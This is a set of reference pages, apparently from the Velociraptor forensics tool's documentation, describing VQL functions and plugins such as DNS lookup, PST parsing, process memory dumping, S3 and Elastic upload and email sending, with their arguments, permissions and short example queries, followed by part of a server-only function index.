name|The name to lookup|string (required)
server|A DNS server to query - if not provided uses the system resolver.|string
type|Type of lookup, can be CNAME, NS, SOA, TXT, DNSKEY, AXFR, A (default)|string
prefer_go|Prefer calling the native Go implementation rather than the system.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Perform a DNS resolution.

This function allows DNS to be resolved from within VQL. You can
use the regular system resolver (for example on windows will go
through the resolver cache service).

You can also specify an external DNS server, causing the query to
contact the DNS server for resolving the names.

### Example

The first query resolves through an external DNS server
while the second uses the local resolver.

```
SELECT host(name='www.google.com', server='8.8.8.8:53'),
   host(name='www.google.com')
FROM scope()
```

### Notes

No caching is currently provided so this may generate a lot
of load on DNS servers when scanning many rows.



---END OF FILE---

======
FILE: /content/vql_reference/other/parse_pst/_index.md
======
---
title: parse_pst
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_pst
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|The PST file to parse.|OSPath (required)
FolderPath|The folder path to save the attachments from emails.|string
accessor|The accessor to use|string
raw|If set we emit the raw message object for all objects|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse a PST file and extract email data.


---END OF FILE---

======
FILE: /content/vql_reference/other/getpid/_index.md
======
---
title: getpid
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## getpid
<span class='vql_type label label-warning pull-right page-header'>Function</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Returns the current pid of the Velociraptor process.

This is typically used to exclude analysis from our own process.



---END OF FILE---

======
FILE: /content/vql_reference/other/url/_index.md
======
---
title: url
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## url
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
scheme|The scheme to use|string
host|The host component|string
path|The path component|string
fragment|The fragment|string
query|A dict representing a query string|Any
parse|A url to parse|string

### Description

Construct a URL or parse one.

This function parses or constructs URLs. A URL may be constructed from
scratch by providing all the components or it may be parsed from an
existing URL.

The returned object is a [golang
URL](https://golang.org/pkg/net/url/#URL) and can be serialized again
using its `String` method.

This function is important when constructing parameters for certain
accessors which receive a URL. For example the `zip` accessor requires
its file names to consist of URLs. The Zip accessor interprets the URL
in the following way:

- The scheme is the delegate accessor to use.
- The path is the delegate accessor's filename
- The fragment is used by the zip accessor to retrieve the zip member itself.

In this case it is critical to properly escape each level - it is not
possible in the general case to simply append strings. You need to use
the `url()` function to build the proper url.



---END OF FILE---

======
FILE: /content/vql_reference/other/path_join/_index.md
======
---
title: path_join
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## path_join
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
components|Path components to join.|list of Any (required)
sep|Separator to use (default /)|string
path_type|Type of path (e.g. 'windows')|string

### Description

Build a path by joining all components.


---END OF FILE---

======
FILE: /content/vql_reference/other/sql/_index.md
======
---
title: sql
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sql
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
driver|sqlite, mysql,or postgres|string (required)
connstring|SQL Connection String|string
file|Required if using sqlite driver|OSPath
accessor|The accessor to use if using sqlite|string
query||string (required)
args||Any

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Run queries against sqlite, mysql, and postgres databases


---END OF FILE---

======
FILE: /content/vql_reference/other/cache/_index.md
======
---
title: cache
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## cache
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
func|A function to evaluate|LazyExpr (required)
name|The global name of this cache (needed when more than one)|string
key|Cache key to use.|string (required)
period|The latest age of the cache.|int64

### Description

Creates a cache object.

A Cache is a data structure which is used to speed up calculating
data by keeping it's value in memory. A cache is essentially a key
value store - when the key is accessed, the function will be
calculated producing a value. If the key is accessed again, the
value is returned from the cache without calculating it again.

For example consider the following:

```vql
    LET get_pid_query(Lpid) =
       SELECT Pid, Ppid, Name FROM pslist(pid=Lpid)

    SELECT cache(func=get_pid_query(Lpid=Pid), key=str(str=Pid))
    FROM ....
```

The cache will ensure that get_pid_query() is only called once per
unique Pid by comparing the key against the internal memory store.



---END OF FILE---

======
FILE: /content/vql_reference/other/rekey/_index.md
======
---
title: rekey
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rekey
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
wait|Wait this long before rekeying the client.|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">EXECVE</span>

### Description

Causes the client to rekey and regenerate a new client ID. DANGEROUS! This will change the client's identity and it will appear as a new client in the GUI.


---END OF FILE---

======
FILE: /content/vql_reference/other/process_tracker/_index.md
======
---
title: process_tracker
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
sync_query|Source for full tracker updates. Query must emit rows with the ProcessTrackerUpdate shape - usually uses pslist() to form a full sync.|StoredQuery
sync_period|How often to do a full sync (default 5000 msec).|int64
update_query|An Event query that produces live updates of the tracker state.|StoredQuery
max_size|Maximum size of process tracker LRU.|int64
enrichments|One or more VQL lambda functions that can enrich the data for the process.|list of string

### Description

Install a global process tracker.

The process tracker is an in-memory cache. It has a limited size with older
records being expired. This LRU cache size is controlled by the `max_size`
argument. The default is 10k records.

The tracker has two queries: a sync_query and an update_query. The update
query resets the internal database.



---END OF FILE---

======
FILE: /content/vql_reference/other/gcs_pubsub_publish/_index.md
======
---
title: gcs_pubsub_publish
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## gcs_pubsub_publish
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
topic|The topic to publish to|string (required)
project_id|The project id to publish to|string (required)
msg|Message to publish to Pubsub|Any (required)
credentials|The credentials to use|string (required)
attributes|The publish attributes|ordereddict.Dict (required)

### Description

Publish a message to Google PubSub.


---END OF FILE---

======
FILE: /content/vql_reference/other/collect/_index.md
======
---
title: collect
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## collect
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
artifacts|A list of artifacts to collect.|list of string (required)
output|A path to write the output file on.|string
report|A path to write the report on (deprecated and ignored).|string
args|Optional parameters.|Any
password|An optional password to encrypt the collection zip.|string
format|Output format (csv, jsonl, csv_only).|string
artifact_definitions|Optional additional custom artifacts.|Any
template|(Deprecated Ignored).|string
level|Compression level between 0 (no compression) and 9.|int64
ops_per_sec|Rate limiting for collections (deprecated).|int64
cpu_limit|Set query cpu_limit value|float64
iops_limit|Set query iops_limit value|float64
progress_timeout|If no progress is detected in this many seconds, we terminate the query and output debugging information|float64
timeout|Total amount of time in seconds, this collection will take. Collection is cancelled when timeout is exceeded.|float64
metadata|Metadata to store in the zip archive. Outputs to metadata.json in top level of zip file.|StoredQuery
concurrency|Number of concurrent collections.|int64
remapping|A Valid remapping configuration in YAML or JSON format.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Collect artifacts into a local file.

This plugin is essentially the same as the `velociraptor artifacts
collect --output file.zip` command. It will collect the artifacts
into a zip file.



---END OF FILE---

======
FILE: /content/vql_reference/other/rand/_index.md
======
---
title: rand
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rand
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
range|Selects a random number up to this range.|int64

### Description

Selects a random number.


---END OF FILE---

======
FILE: /content/vql_reference/other/netcat/_index.md
======
---
title: netcat
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## netcat
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
address|The address to connect to (can be a file in case of a unix domain socket)|string (required)
type|Can be tcp or unix (default TCP)|string
send|Data to send before reading|string
sep|The separator that will be used to split (default - line feed)|string
chunk_size|Read input with this chunk size (default 64kb)|int
retry|Seconds to wait before retry - default 0 - do not retry|int

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Make a tcp connection and read data from a socket.


---END OF FILE---

======
FILE: /content/vql_reference/other/timestamp_format/_index.md
======
---
title: timestamp_format
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## timestamp_format
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
time|Time to format|Any (required)
format|A format specifier as per the Golang time.Format. Additionally any constants specified in https://pkg.go.dev/time#pkg-constants can be used.|string

### Description

Format a timestamp into a string.

This uses the same type of format string as described
https://pkg.go.dev/time#Time.Format . You can also use any of the
constants described in https://pkg.go.dev/time#pkg-constants as a
shorthand to common time formatting directives.

The output timezone is UTC by default but can be changed using the
`TZ` VQL variable.

### Example

```vql
LET TZ="Europe/Berlin"

SELECT timestamp_format(time=now(), format="RFC3339") FROM scope()

> "2024-08-29T02:05:23+02:00"
```



---END OF FILE---

======
FILE: /content/vql_reference/other/pe_dump/_index.md
======
---
title: pe_dump
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pe_dump
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|The pid to dump.|uint64 (required)
base_offset|The offset in the file for the base address.|int64 (required)
in_memory|By default we store to a tempfile and return the path. If this option is larger than 0, we prepare the file in a memory buffer at the specified limit, to avoid AV alerts on disk access.|uint64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Dump a PE file from process memory.


---END OF FILE---

======
FILE: /content/vql_reference/other/process_tracker_all/_index.md
======
---
title: process_tracker_all
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker_all
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Get all processes stored in the tracker.


---END OF FILE---

======
FILE: /content/vql_reference/other/efivariables/_index.md
======
---
title: efivariables
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## efivariables
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
namespace|Variable namespace.|string
name|Variable name|string
value|Read variable value|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerate efi variables.


---END OF FILE---

======
FILE: /content/vql_reference/other/version/_index.md
======
---
title: version
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## version
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
function||string
plugin||string

### Description

Gets the version of a VQL plugin or function.

This is useful when writing portable VQL which can work with
older versions of Velociraptor. When Velociraptor plugins evolve
in an incompatible way their version is incremented. It is
possible to cater for multiple versions in the VQL using an if()
plugin.

For example the following can chose from a legacy query or a
modern query based on the plugin version:

```vql
 SELECT * FROM if(
  condition=version(plugin="glob") >= 1,
  then=NewQuery,
  else=LegacyQuery)
```



---END OF FILE---

======
FILE: /content/vql_reference/other/geoip/_index.md
======
---
title: geoip
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## geoip
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
ip|IP Address to lookup.|string (required)
db|Path to the MaxMind GeoIP Database.|string (required)

### Description

Lookup an IP Address using the MaxMind GeoIP database.

You can get a copy of the database from https://www.maxmind.com/.

The database must be locally accessible so geoip lookup is typically done
only on the server.

### See also

- [cidr_contains]({{< ref "/vql_reference/other/cidr_contains/" >}}):
  Calculates if an IP address falls within a range of CIDR specified
  networks.
- [ip]({{< ref "/vql_reference/other/ip/" >}}): Format an IP address.



---END OF FILE---

======
FILE: /content/vql_reference/other/favorites_list/_index.md
======
---
title: favorites_list
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## favorites_list
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

List all user's favorites.


---END OF FILE---

======
FILE: /content/vql_reference/other/pipe/_index.md
======
---
title: pipe
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pipe
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|Name to call the pipe|string
query|Run this query to generator data - the first column will be appended to pipe data.|StoredQuery
sep|The separator that will be used to split each read (default: no separator will be used)|string

### Description

A pipe allows plugins that use files to read data from a vql
query.

**NOTE: this is not the same as a Windows named pipe**.

This is needed to be able to use the "pipe" accessor.

### Example

In the following example we create a pipe from a query which
reads a log file line by line. Each line is being transformed by
a regex and potentially filtered (perhaps to fix up buggy CSV
implementations that generated a bad CSV).

The pipe is then fed into the parse_csv() plugin to parse each
line as a csv file.

```vql
LET MyPipe = pipe(query={
    SELECT regex_replace(
      re='''^(\d{4}-\d{2}-\d{2}) (\d{2}:)''',
      replace='''${1}T${2}''', source=Line) AS Line
    FROM parse_lines(filename=IISPath)
    WHERE NOT Line =~ "^#"
  }, sep="\n")

SELECT * FROM parse_csv(
   columns=Columns, separator=" ",
   filename="MyPipe", accessor="pipe")
```



---END OF FILE---

======
FILE: /content/vql_reference/other/upload_s3/_index.md
======
---
title: upload_s3
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload_s3
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|The name of the file that should be stored on the server|string
accessor|The accessor to use|string
bucket|The bucket to upload to|string (required)
region|The region the bucket is in|string
credentials_key|The AWS key credentials to use|string
credentials_secret|The AWS secret credentials to use|string
credentials_token|The AWS session token to use (only needed for temporary credentials)|string
endpoint|The Endpoint to use|string
serverside_encryption|The server side encryption method to use|string
kms_encryption_key|The server side KMS key to use|string
s3upload_root|Prefix for the S3 object|string
skip_verify|Skip TLS Verification|bool
secret|Alternatively use a secret from the secrets service. Secret must be of type 'AWS S3 Creds'|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Upload files to S3.


---END OF FILE---

======
FILE: /content/vql_reference/other/rsyslog/_index.md
======
---
title: rsyslog
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rsyslog
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
port|Destination port to connect to. If not specified we use 514|uint64
protocol|Protocol to use, default UDP but can be TCP or TLS|string
message|Message to log.|string (required)
facility|Facility of this message|int64
severity|Severity of this message|int64
timestamp|Timestamp of this message, if omitted we use the current time.|time.Time
hostname|Hostname associated with this message. If omitted we use the current hostname.|string
app_name|Application that generated the log|string
proc_id|Process ID that generated this log|string
sd_id|When sending structured data, this is the Structured Data ID|string
args|A dict to be interpolated into the message as structured data, according to RFC5424.|ordereddict.Dict
root_ca|As a better alternative to disable_ssl_security, allows root ca certs to be added here.|string

### Description

Send an RFC5424 compliant remote syslog message.


---END OF FILE---

======
FILE: /content/vql_reference/other/any/_index.md
======
---
title: any
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## any
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
items|The items to consider. Can be an array, subquery or stored query. Will only be lazily evaluated!|Any (required)
filter|A callback to consider each item|Lambda
regex|Optionally one or more regex can be provided for convenience|list of string

### Description

Returns TRUE if any items are true.


---END OF FILE---

======
FILE: /content/vql_reference/other/lru/_index.md
======
---
title: lru
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## lru
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
size|Size of the LRU (default 1000)|int64

### Description

Creates an LRU object

A LRU is like a dict, except that older items are expired. It is
useful to creating running lookup values without exceeding memory
constraints.

An example of this query is maintaining lookups between Kernel
objects and key names within the Windows Kernel Registry provider.

```vql
LET Cache <= lru()

SELECT *, EventData,
    get(item=Cache, field=EventData.KeyObject) AS KeyName
FROM watch_etw(guid="{70EB4F03-C1DE-4F73-A051-33D13D5413BD}")
WHERE if(
   condition=System.ID = 2,  -- KeyOpen event
   then=set(item=Cache,
            field=EventData.KeyObject,
            value=EventData.RelativeName),
   else=TRUE)
```

Note how `set()` can be used to add items to the cache and `get()`
is used to retrieve items.



---END OF FILE---

======
FILE: /content/vql_reference/other/uuid/_index.md
======
---
title: uuid
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## uuid
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Generate a UUID.


---END OF FILE---

======
FILE: /content/vql_reference/other/help/_index.md
======
---
title: help
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## help
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Dump information about all VQL functions and plugins.


---END OF FILE---

======
FILE: /content/vql_reference/other/remap/_index.md
======
---
title: remap
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## remap
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
config|A Valid remapping configuration in YAML format|string (required)
copy|Accessors to copy to the new scope|list of string
clear|If set we clear all accessors from the device manager|bool

### Description

Apply a remapping configuration to the root scope.


---END OF FILE---

======
FILE: /content/vql_reference/other/elastic_upload/_index.md
======
---
title: elastic_upload
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## elastic_upload
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Source for rows to upload.|StoredQuery (required)
threads|How many threads to use.|int64
index|The name of the index to upload to. If not specified ensure a column is named '_index'.|string
type|The type of the index to upload to.|string
chunk_size|The number of rows to send at the time.|int64
addresses|A list of Elasticsearch nodes to use.|list of string
username|Username for HTTP Basic Authentication.|string
password|Password for HTTP Basic Authentication.|string
cloud_id|Endpoint for the Elastic Service (https://elastic.co/cloud).|string
api_key|Base64-encoded token for authorization; if set, overrides username and password.|string
wait_time|Batch elastic upload this long (2 sec).|int64
pipeline|Pipeline for uploads|string
disable_ssl_security|Disable ssl certificate verifications (deprecated in favor of SkipVerify).|bool
skip_verify|Disable ssl certificate verifications.|bool
root_ca|As a better alternative to disable_ssl_security, allows root ca certs to be added here.|string
max_memory_buffer|How large we allow the memory buffer to grow to while we are trying to contact the Elastic server (default 100mb).|uint64
action|Either index or create. For data streams this must be create.|string
secret|Alternatively use a secret from the secrets service. Secret must be of type 'AWS S3 Creds'|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Upload rows to elastic.

This uses the Elastic bulk upload API to push arbitrary rows to
elastic. The query specified in `query` will be run and each row
it emits will be uploaded as a separate event to Elastic.

You can either specify the elastic index explicitly using the
`index` parameter or provide an `_index` column in the query
itself to send the row to a different index each time.



---END OF FILE---

======
FILE: /content/vql_reference/other/write_crypto_file/_index.md
======
---
title: write_crypto_file
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## write_crypto_file
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|Path to the file to write|OSPath (required)
query|query to write into the file.|StoredQuery (required)
max_wait|How often to flush the file (default 60 sec).|uint64
max_rows|How many rows to buffer before writing (default 1000).|uint64
max_size|When the file grows to this size, truncate it (default 1Gb).|uint64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Write a query into an encrypted local storage file.


---END OF FILE---

======
FILE: /content/vql_reference/other/eval/_index.md
======
---
title: eval
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## eval
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
func|Lambda function to evaluate e.g. x=>1+1 where x will be the current scope.|Lambda (required)
args|An array of elements to use as args for the lambda function. If not provided we pass the scope|Any

### Description

Evaluate a vql lambda function on the current scope.

This allows you to use a string as a VQL function - the string
will be parsed at runtime as a VQL expression and then evaluated.

You can access previously defined variables or functions within
the scope.

Note that when eval calls the function, the current scope will be
passed as the first parameter to the lambda.

### Example

```vql
LET AddTwo(x) = x + 2

SELECT eval(func="x=>AddTwo(x=1)") AS Three FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/other/dedup/_index.md
======
---
title: dedup
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## dedup
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
key|A column name to use as dedup key.|string (required)
query|Run this query to generate items.|StoredQuery (required)
timeout|LRU expires in this much time (default 60 sec).|uint64
size|Size of the LRU cache.|int64

### Description

Dedups the query based on a column. This will suppress rows with identical values for the key column


---END OF FILE---

======
FILE: /content/vql_reference/other/mail/_index.md
======
---
title: mail
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mail
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
to|Recipient of the mail|list of string (required)
from|The from email address.|string
cc|A cc for the mail|list of string
subject|The subject.|string
body|The body of the mail.|string (required)
period|How long to wait before sending the next mail - help to throttle mails.|int64
server_port|The SMTP server port to use (default 587).|uint64
server|The SMTP server to use (if not specified we try the config file).|string
auth_username|The SMTP username we authenticate to the server.|string
auth_password|The SMTP username password we use to authenticate to the server.|string
skip_verify|Skip SSL verification(default: False).|bool
root_ca|As a better alternative to disable_ssl_security, allows root ca certs to be added here.|string
secret|Alternatively use a secret from the secrets service. Secret must be of type 'SMTP Creds'|string
headers|A dict of headers to send.|ordereddict.Dict

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Send Email to a remote server.

This function will send an email to a remote SMTP server. The mail
will be sent using SMTP with TLS and authentication.

Mails will be globally rate limited (among all queries) to the
specified period (default 60 seconds) to prevent overloading the
SMTP server. For this reason it is not suitable as a way to send
high number of events - use it sparingly to notify on some rare
events.

You can either fill in the auth_username and auth_password
parameters directly or use the secrets service to encapsulate
secrets in a managed way.

You can set any headers needed - for example to send HTML email
set the `Content-Type` to "text/html"

### Example

```vql
SELECT mail(secret="gmail",
            subject="Hello from Velociraptor",
            to="user@example.com",
            headers=dict(`Content-Type`="text/html"),
            body="<h1>Good morning</h1><p>From Velociraptor")
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/other/stat/_index.md
======
---
title: stat
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## stat
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|One or more files to open.|OSPath (required)
accessor|An accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Get file information. Unlike glob() this does not support wildcards.


---END OF FILE---

======
FILE: /content/vql_reference/other/alert/_index.md
======
---
title: alert
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## alert
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|Name of the alert.|string (required)
dedup|Suppress same message in this many seconds (default 7200 sec or 2 hours).|int64
condition|If specified we ignore the alert unless the condition is true|Any

### Description

Generate an alert message.

### See also

- [log]({{< ref "/vql_reference/popular/log/" >}}): alerts and log messages are similar in
  concept and use the same deduplication mechanism which is explained with
  examples for the `log()` function.



---END OF FILE---

======
FILE: /content/vql_reference/other/sum/_index.md
======
---
title: sum
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sum
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item||int64 (required)

### Description

Sums the items.


---END OF FILE---

======
FILE: /content/vql_reference/other/process_tracker_updates/_index.md
======
---
title: process_tracker_updates
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker_updates
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Get the process tracker update events from the global process tracker.


---END OF FILE---

======
FILE: /content/vql_reference/other/for/_index.md
======
---
title: for
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## for
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
var|The variable to assign.|string (required)
foreach|The variable to iterate over.|StoredQuery (required)
query|Run this query over the item.|StoredQuery

### Description

Iterate over a list.

DEPRECATED - use foreach() instead.



---END OF FILE---

======
FILE: /content/vql_reference/server/_index.md
======
---
title: Server-only
weight: 40
linktitle: Server
index: true
no_edit: true
no_children: true
---

Velociraptor provides complete control of the server within VQL queries. On
the server the VQL engine contains the following plugins and functions
which you can use to manage and automate the server via VQL queries. Such
server-side VQL can be run via Server Artifacts, Notebooks, or the API.

{{% notice warning %}}

Since these rely on the server datastore and server services they are not
available on clients!

{{% /notice %}}
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[add_client_monitoring](add_client_monitoring)|<span class='vql_type'>Function</span>|Adds a new artifact to the client monitoring table|
|[add_server_monitoring](add_server_monitoring)|<span class='vql_type'>Function</span>|Adds a new artifact to the server monitoring table|
|[artifact_definitions](artifact_definitions)|<span class='vql_type'>Plugin</span>|Dump artifact definitions from the internal repository|
|[artifact_delete](artifact_delete)|<span class='vql_type'>Function</span>|Deletes an artifact from the global repository|
|[artifact_set](artifact_set)|<span class='vql_type'>Function</span>|Sets an artifact into the global repository|
|[artifact_set_metadata](artifact_set_metadata)|<span class='vql_type'>Function</span>|Sets metadata about the artifact|
|[backup](backup)|<span class='vql_type'>Plugin</span>|Generates a backup file|
|[backup_restore](backup_restore)|<span class='vql_type'>Plugin</span>|Restore state from a backup file|
|[cancel_flow](cancel_flow)|<span class='vql_type'>Function</span>|Cancels the flow|
|[client_create](client_create)|<span class='vql_type'>Function</span>|Create a new client in the data store|
|[client_delete](client_delete)|<span class='vql_type'>Plugin</span>|Delete all information related to a client from the filestore|
|[client_info](client_info)|<span class='vql_type'>Function</span>|Returns client info (like the fqdn) for a specific client from the|
|[client_metadata](client_metadata)|<span class='vql_type'>Function</span>|Returns client metadata from the datastore|
|[client_set_metadata](client_set_metadata)|<span class='vql_type'>Function</span>|Sets client metadata|
|[clients](clients)|<span class='vql_type'>Plugin</span>|Returns client info for one or more clients from the datastore|
|[collect_client](collect_client)|<span class='vql_type'>Function</span>|Launch an artifact collection against a client|
|[create_flow_download](create_flow_download)|<span class='vql_type'>Function</span>|Creates a download pack for the flow|
|[create_hunt_download](create_hunt_download)|<span class='vql_type'>Function</span>|Creates a download pack for a hunt|
|[create_notebook_download](create_notebook_download)|<span class='vql_type'>Function</span>|Creates a notebook export zip file|
|[delete_events](delete_events)|<span class='vql_type'>Plugin</span>|Delete events from a flow|
|[delete_flow](delete_flow)|<span class='vql_type'>Plugin</span>|Delete all the files that make up a flow|
|[enumerate_flow](enumerate_flow)|<span class='vql_type'>Plugin</span>|Enumerate all the files that make up a flow|
|[favorites_delete](favorites_delete)|<span class='vql_type'>Function</span>|Delete a favorite|
|[favorites_save](favorites_save)|<span class='vql_type'>Function</span>|Save a collection into the favorites|
|[file_store](file_store)|<span class='vql_type'>Function</span>|Resolves file store paths into full filesystem paths|
|[file_store_delete](file_store_delete)|<span class='vql_type'>Function</span>|Delete file store paths|
|[flow_logs](flow_logs)|<span class='vql_type'>Plugin</span>|Retrieve the query logs of a flow|
|[flow_results](flow_results)|<span class='vql_type'>Plugin</span>|Retrieve the results of a flow|
|[flows](flows)|<span class='vql_type'>Plugin</span>|Retrieve the flows launched on each client|
|[get_client_monitoring](get_client_monitoring)|<span class='vql_type'>Function</span>|Retrieve the current client monitoring state|
|[get_flow](get_flow)|<span class='vql_type'>Function</span>|Gets flow details|
|[get_server_monitoring](get_server_monitoring)|<span class='vql_type'>Function</span>|Retrieve the current server monitoring state|
|[gui_users](gui_users)|<span class='vql_type'>Plugin</span>|Retrieve the list of users on the server|
|[hunt](hunt)|<span class='vql_type'>Function</span>|Create and launch a hunt|
|[hunt_add](hunt_add)|<span class='vql_type'>Function</span>|Assign a client to a hunt|
|[hunt_delete](hunt_delete)|<span class='vql_type'>Plugin</span>|Delete a hunt|
|[hunt_flows](hunt_flows)|<span class='vql_type'>Plugin</span>|Retrieve the flows launched by a hunt|
